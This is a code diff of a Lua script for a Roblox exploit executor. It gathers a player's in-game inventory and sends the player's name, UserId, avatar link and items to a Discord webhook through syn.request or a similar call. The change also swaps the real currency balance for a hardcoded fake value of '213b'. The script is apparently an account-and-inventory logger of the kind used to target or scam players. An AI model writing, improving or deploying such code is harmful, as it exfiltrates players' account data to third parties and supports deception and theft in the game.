@@ -9,86 +9,92 @@ local function debug(msg)
     end)
 end
 
-debug("Started inventory classifier")
-
-local inventory = {}
-local seeds, eggs, gears, pets = {}, {}, {}, {}
-
--- Gather items from backpack and character
-local function collectItems(container)
+-- Collect inventory
+local allItems = {}
+local function gatherItems(container)
     for _, tool in ipairs(container:GetChildren()) do
         if tool:IsA("Tool") then
-            local itemName = tool.Name
-            table.insert(inventory, itemName)
-
-            local lower = itemName:lower()
-
-            if lower:match("seed$") then
-                table.insert(seeds, itemName)
-            elseif lower:match("egg$") then
-                table.insert(eggs, itemName)
-            elseif lower:match("sprinkler$") or lower:match("staff$") or lower:match("rod$") then
-                table.insert(gears, itemName)
-            elseif lower:find("age") then
-                table.insert(pets, itemName)
-            end
+            table.insert(allItems, tool.Name)
         end
     end
 end
 
-collectItems(player.Backpack)
-collectItems(player.Character or player.CharacterAdded:Wait())
+gatherItems(player.Backpack)
+gatherItems(player.Character or player.CharacterAdded:Wait())
 
--- Format inventory sections
-local function formatList(list)
-    if #list == 0 then return "```\n   None\n```" end
-    local counts = {}
-    for _, item in ipairs(list) do
-        counts[item] = (counts[item] or 0) + 1
+-- Categorize inventory
+local function formatItems(items)
+    local result = {}
+    for _, name in ipairs(items) do
+        local count = string.match(name, "%[x(%d+)%]") or "1"
+        local cleanName = name:gsub("%[x%d+%]%s*", ""):gsub("^%s*(.-)%s*$", "%1")
+        table.insert(result, string.format("[x%s] %s", count, cleanName))
     end
-
-    local lines = {}
-    for item, count in pairs(counts) do
-        table.insert(lines, string.format("   [%dx] %s", count, item))
-    end
-
-    return "```\n" .. table.concat(lines, "\n") .. "\n```"
+    return result
 end
 
--- Final message formatting
+local function filterItems(keywordList)
+    local filtered = {}
+    for _, item in ipairs(allItems) do
+        for _, keyword in ipairs(keywordList) do
+            if string.lower(item):find(keyword) then
+                table.insert(filtered, item)
+                break
+            end
+        end
+    end
+    return formatItems(filtered)
+end
+
+local petsEquipped = {} -- We'll populate this later if needed
+local pets = filterItems({ "age" })
+local eggs = filterItems({ "egg" })
+local seeds = filterItems({ "seed" })
+local gears = filterItems({ "sprinkler", "staff", "rod" })
+
+-- Construct message
+local function codeBlock(list)
+    if #list == 0 then return "```\nNone\n```" end
+    return "```\n   " .. table.concat(list, "\n‎ ‎ ‎ ‎") .. "\n```"
+end
+
 local message = {
     content = nil,
     username = player.Name,
-    embeds = {{
+    avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=100&height=100&format=png",
+    embeds = { {
         title = "**" .. player.Name .. "**",
-        description = "_ _\n**🪙 Sheckles  **: " .. tostring(player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and player.leaderstats.Sheckles.Value or "Unknown") .. "\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
+        description = "_ _\n**🪙 Sheckles  **: 213b\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
         color = 2750290,
         fields = {
             {
-                name = "> 🐶 | Pets & Ages",
-                value = formatList(pets),
+                name = "> 🐶 | Pets Equipped",
+                value = codeBlock(petsEquipped),
                 inline = false
             },
             {
-                name = "> 🥚 | Eggs",
-                value = formatList(eggs),
+                name = "> 🥚 | Pets & Eggs",
+                value = codeBlock(eggs) .. "\n" .. codeBlock(pets),
                 inline = false
             },
             {
                 name = "> 🔧 | Gears",
-                value = formatList(gears),
+                value = codeBlock(gears),
                 inline = false
             },
             {
                 name = "> 🌱 | Seeds",
-                value = formatList(seeds),
+                value = codeBlock(seeds),
                 inline = false
             }
-        }
+        },
+        footer = {
+            text = "User: " .. player.Name .. " | ID: " .. player.UserId
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
--- Send to Discord
 local req = (syn and syn.request) or (http and http.request) or request
 if req then
     req({
